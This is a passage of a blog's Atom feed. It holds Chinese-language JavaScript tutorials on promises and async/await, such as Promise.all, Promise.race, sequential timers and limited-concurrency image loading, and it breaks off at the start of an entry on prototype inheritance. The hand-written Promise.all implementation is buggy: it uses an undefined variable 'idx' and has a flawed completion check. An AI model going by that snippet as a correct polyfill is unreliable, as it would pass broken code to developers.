<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小柒</title>
  
  <subtitle>www.xiaoqi.cn</subtitle>
  <link href="https://coloey.github.io/atom.xml" rel="self"/>
  
  <link href="https://coloey.github.io/"/>
  <updated>2022-04-16T15:08:04.631Z</updated>
  <id>https://coloey.github.io/</id>
  
  <author>
    <name>小柒</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>异步函数策略</title>
    <link href="https://coloey.github.io/2022/04/16/%E5%BC%82%E6%AD%A5%E5%87%BD%E6%95%B0%E7%AD%96%E7%95%A5/"/>
    <id>https://coloey.github.io/2022/04/16/%E5%BC%82%E6%AD%A5%E5%87%BD%E6%95%B0%E7%AD%96%E7%95%A5/</id>
    <published>2022-04-16T03:35:37.000Z</published>
    <updated>2022-04-16T15:08:04.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实现sleep"><a href="#实现sleep" class="headerlink" title="实现sleep"></a>实现sleep</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">delay</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>)=&gt;</span><span class="built_in">setTimeout</span>(resolve,delay));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> t0=<span class="built_in">Date</span>.now();</span><br><span class="line">            <span class="keyword">await</span> sleep(<span class="number">1500</span>);<span class="comment">//暂停1500ms,await会期望等到一个实现thenable接口的对象，没有的话也会将其包装为promise</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">Date</span>.now()-t0);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h1 id="实现平行加速"><a href="#实现平行加速" class="headerlink" title="实现平行加速"></a>实现平行加速</h1><p>promise没有按顺序执行，但是await按顺序接收到每个promise的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">randomDelay</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> delay=<span class="built_in">Math</span>.random()*<span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>)=&gt;</span><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;id&#125;</span> finished`</span>);</span><br><span class="line">                resolve()</span><br><span class="line">            &#125;,delay))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> t0=<span class="built_in">Date</span>.now()</span><br><span class="line">            <span class="keyword">const</span> p0=randomDelay(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">const</span> p1=randomDelay(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">const</span> p2=randomDelay(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">const</span> p3=randomDelay(<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">await</span> p0;</span><br><span class="line">            <span class="keyword">await</span> p1;</span><br><span class="line">            <span class="keyword">await</span> p2;</span><br><span class="line">            <span class="keyword">await</span> p3;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="built_in">console</span>.log,<span class="number">0</span>,<span class="string">`<span class="subst">$&#123;<span class="built_in">Date</span>.now()-t0&#125;</span> ms elapsed`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        foo();</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">randomDelay</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> delay=<span class="built_in">Math</span>.random()*<span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>)=&gt;</span><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;id&#125;</span> finished`</span>);</span><br><span class="line">                resolve(id)</span><br><span class="line">            &#125;,delay))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> t0=<span class="built_in">Date</span>.now()</span><br><span class="line">            <span class="keyword">const</span> promises=<span class="built_in">Array</span>(<span class="number">5</span>).fill(<span class="literal">null</span>).map(<span class="function">(<span class="params">key,index</span>)=&gt;</span>randomDelay(index));</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">const</span> p <span class="keyword">of</span> promises)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`awaited <span class="subst">$&#123;<span class="keyword">await</span> p&#125;</span>`</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="built_in">console</span>.log,<span class="number">0</span>,<span class="string">`<span class="subst">$&#123;<span class="built_in">Date</span>.now()-t0&#125;</span> ms elapsed`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        foo();</span><br></pre></td></tr></table></figure><h1 id="Promise-all原理"><a href="#Promise-all原理" class="headerlink" title="Promise.all原理"></a>Promise.all原理</h1><p>只有传入的所有Promise都完成，返回promise才能完成，如果有任何promise被拒绝，返回的主promise就立即拒绝（抛弃任何其他promise的结果），如果全部完成，你会得到一个数组，其中包含传入的所有promise的完成值，对于拒绝的情况，你只会的到第一个拒绝promise的拒绝理由值，这种模式成为门，所有人到齐了才开门,传入空数组会立即完成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.all=<span class="function"><span class="keyword">function</span>(<span class="params">promises</span>)</span>&#123;</span><br><span class="line">           <span class="keyword">const</span> res=[];</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="line">               promises.forEach(<span class="function"><span class="params">promise</span>=&gt;</span>&#123;</span><br><span class="line">                   promise.then(<span class="function">(<span class="params">value,index</span>)=&gt;</span>&#123;</span><br><span class="line">                       res[idx]=value;</span><br><span class="line">                       <span class="keyword">if</span>(res.length==promises.length)&#123;</span><br><span class="line">                           resolve(res)</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;,<span class="function"><span class="params">reason</span>=&gt;</span>reject(reason))</span><br><span class="line">               &#125;)</span><br><span class="line">           &#125;)</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">runAsync</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> r(x, <span class="built_in">console</span>.log(x)), <span class="number">1000</span>))</span><br><span class="line">  <span class="keyword">return</span> p</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runReject</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> rej(<span class="string">`Error: <span class="subst">$&#123;x&#125;</span>`</span>, <span class="built_in">console</span>.log(x)), <span class="number">1000</span> * x))</span><br><span class="line">  <span class="keyword">return</span> p</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Promise</span>.all([runAsync(<span class="number">1</span>), runReject(<span class="number">4</span>), runAsync(<span class="number">3</span>), runReject(<span class="number">2</span>)])</span><br><span class="line">  .then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">console</span>.log(res))</span><br><span class="line">  .catch(<span class="function"><span class="params">err</span> =&gt;</span> <span class="built_in">console</span>.log(err))</span><br><span class="line"><span class="comment">// 1s后输出</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="comment">// 2s后输出</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="attr">Error</span>: <span class="number">2</span></span><br><span class="line"><span class="comment">// 4s后输出</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h1 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race():"></a>Promise.race():</h1><p>只有第一个决议的promise取胜，并且决议结果成为返回promise的决议。其他任务虽然会继续进行，但是race已经不管那些任务的结果了，不能传入空数组，传入空数组promise.race()会<strong>挂住</strong>，且永远不会决议</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runAsync</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> r(x, <span class="built_in">console</span>.log(x)), <span class="number">1000</span>))</span><br><span class="line">  <span class="keyword">return</span> p</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Promise</span>.race([runAsync(<span class="number">1</span>), runAsync(<span class="number">2</span>), runAsync(<span class="number">3</span>)])</span><br><span class="line">  .then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;result: &#x27;</span>, res))</span><br><span class="line">  .catch(<span class="function"><span class="params">err</span> =&gt;</span> <span class="built_in">console</span>.log(err))</span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="string">&#x27;result: &#x27;</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h1 id="每隔一秒打印1-2-3"><a href="#每隔一秒打印1-2-3" class="headerlink" title="每隔一秒打印1,2,3"></a>每隔一秒打印1,2,3</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">        arr.reduce(</span><br><span class="line">            <span class="function">(<span class="params">p,x</span>)=&gt;</span>p.then(<span class="function">()=&gt;</span><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span>=&gt;</span><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>resolve(<span class="built_in">console</span>.log(x)),<span class="number">1000</span>))),<span class="built_in">Promise</span>.resolve())</span><br></pre></td></tr></table></figure><p>一秒后打印出1，2,3</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr.reduce(</span><br><span class="line">           <span class="function">(<span class="params">p,x</span>)=&gt;</span>p.then(<span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span>=&gt;</span><span class="built_in">setTimeout</span>(resolve(<span class="built_in">console</span>.log(x)),<span class="number">1000</span>))),<span class="built_in">Promise</span>.resolve()</span><br><span class="line">       )</span><br></pre></td></tr></table></figure><h1 id="红绿灯交替闪烁"><a href="#红绿灯交替闪烁" class="headerlink" title="红绿灯交替闪烁"></a>红绿灯交替闪烁</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">red</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">&quot;red&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">yellow</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">&quot;yellow&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">green</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> light=<span class="function">(<span class="params">time,cb</span>)=&gt;</span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span>=&gt;</span>&#123;</span><br><span class="line">              <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                  cb();</span><br><span class="line">                  resolve();</span><br><span class="line">              &#125;,time)</span><br><span class="line">          &#125;)</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> step=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">Promise</span>.resolve()</span><br><span class="line">      .then(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">          <span class="keyword">return</span> light(<span class="number">3000</span>,red)</span><br><span class="line">      &#125;)</span><br><span class="line">      .then(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">          <span class="keyword">return</span> light(<span class="number">2000</span>,yellow)</span><br><span class="line">      &#125;)</span><br><span class="line">      .then(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">          <span class="keyword">return</span> light(<span class="number">1000</span>,green)</span><br><span class="line">      &#125;)&#125;</span><br><span class="line">      step();</span><br></pre></td></tr></table></figure><p>mergepromise</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> time = <span class="function">(<span class="params">timer</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve()</span><br><span class="line">    &#125;, timer)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> ajax1 = <span class="function">() =&gt;</span> time(<span class="number">2000</span>).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> ajax2 = <span class="function">() =&gt;</span> time(<span class="number">1000</span>).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> ajax3 = <span class="function">() =&gt;</span> time(<span class="number">1000</span>).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergePromise</span> (<span class="params">promises</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 在这里写代码</span></span><br><span class="line">  <span class="keyword">let</span> data=[]</span><br><span class="line">  <span class="keyword">let</span> promise=<span class="built_in">Promise</span>.resolve();</span><br><span class="line">  promises.forEach(<span class="function"><span class="params">ajax</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="comment">//第一次then是调用ajax,第二次then是解析ajax的结果</span></span><br><span class="line">      promise=promise.then(ajax).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;data.push(res);<span class="keyword">return</span> data&#125;)<span class="comment">//把每次结果返回</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> promise;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mergePromise([ajax1, ajax2, ajax3]).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(data); <span class="comment">// data 为 [1, 2, 3]</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>异步加载图片</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadImage</span>(<span class="params">url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">        img.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;一张图片加载完成&quot;</span>)</span><br><span class="line">            resolve(img)</span><br><span class="line">        &#125;</span><br><span class="line">        img.onerror=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Cannot load&quot;</span>+url));</span><br><span class="line">        &#125;</span><br><span class="line">        img.src=url;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> urls = [</span><br><span class="line">  <span class="string">&quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting1.png&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting2.png&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting3.png&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting4.png&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting5.png&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/bpmn6.png&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/bpmn7.png&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/bpmn8.png&quot;</span>,</span><br><span class="line">];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">limitedLoad</span>(<span class="params">urls,handler,limit</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sequence=[...urls];</span><br><span class="line">    <span class="keyword">let</span> promises=sequence.splice(<span class="number">0</span>,limit).map(<span class="function">(<span class="params">url,index</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> handler(url).then(<span class="function"><span class="params">index</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> index;<span class="comment">//调用loadImage返回最先加载完成的那张照片下标</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> sequence.reduce(</span><br><span class="line">        <span class="function">(<span class="params">p,url</span>)=&gt;</span>&#123;</span><br><span class="line">           <span class="keyword">return</span>  p.then(<span class="function">()=&gt;</span>&#123;<span class="keyword">return</span> <span class="built_in">Promise</span>.race(promises)&#125;)<span class="comment">//得到第一张加载完成的图片的下标</span></span><br><span class="line">            .then(<span class="function"><span class="params">fastIndex</span>=&gt;</span>&#123;promises[fastIndex]=handler(url).then(<span class="function">()=&gt;</span>&#123;<span class="keyword">return</span> fastIndex&#125;)&#125;)<span class="comment">//将已经加载完成的照片的位置替换为为加载的照片</span></span><br><span class="line">            .catch(<span class="function"><span class="params">err</span>=&gt;</span>&#123;<span class="built_in">console</span>.error(err)&#125;)</span><br><span class="line">    &#125;,<span class="built_in">Promise</span>.resolve())<span class="comment">//初始为Promise.resolve()</span></span><br><span class="line">    .then(<span class="function">()=&gt;</span>&#123;<span class="keyword">return</span> <span class="built_in">Promise</span>.all(promises)&#125;)<span class="comment">//最后3个用Promise.all加载</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">limitedLoad(urls,loadImage,<span class="number">3</span>)</span><br><span class="line">.then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;图片全部加载完成&quot;</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">err</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(err)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;实现sleep&quot;&gt;&lt;a href=&quot;#实现sleep&quot; class=&quot;headerlink&quot; title=&quot;实现sleep&quot;&gt;&lt;/a&gt;实现sleep&lt;/h1&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    <category term="JavaScript" scheme="https://coloey.github.io/categories/JavaScript/"/>
    
    
  </entry>
  
  <entry>
    <title>面向对象的原型模式和对象关联区别</title>
    <link href="https://coloey.github.io/2022/04/15/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%AF%B9%E8%B1%A1%E5%85%B3%E8%81%94%E5%8C%BA%E5%88%AB/"/>
    <id>https://coloey.github.io/2022/04/15/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%AF%B9%E8%B1%A1%E5%85%B3%E8%81%94%E5%8C%BA%E5%88%AB/</id>
    <published>2022-04-15T08:10:58.000Z</published>
    <updated>2022-04-15T08:57:12.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="面向对象的原型模式："><a href="#面向对象的原型模式：" class="headerlink" title="面向对象的原型模式："></a>面向对象的原型模式：</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">who</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.me=who</span><br><span class="line">        &#125;</span><br><span class="line">        Foo.prototype.identify=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I am &quot;</span>+<span class="built_in">this</span>.me</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">Bar</span>(<span class="params">who</span>)</span>&#123;</span><br><span class="line">            Foo.call(<span class="built_in">this</span>,who)</span><br><span class="line">        &#125;</span><br><span class="line">        Bar.prototype=<span class="built_in">Object</span>.create(Foo.prototype);</span><br><span class="line">        Bar.prototype.speak=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">&quot;Hello&quot;</span>+<span class="built_in">this</span>.identify()+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> b1=<span class="keyword">new</span> Bar(<span class="string">&quot;b1&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> b2=<span class="keyword">new</span> Bar(<span class="string">&quot;b2&quot;</span>);</span><br><span class="line">        b1.speak();</span><br><span class="line">        b2.speak();</span><br></pre></td></tr></table></figure><p><img 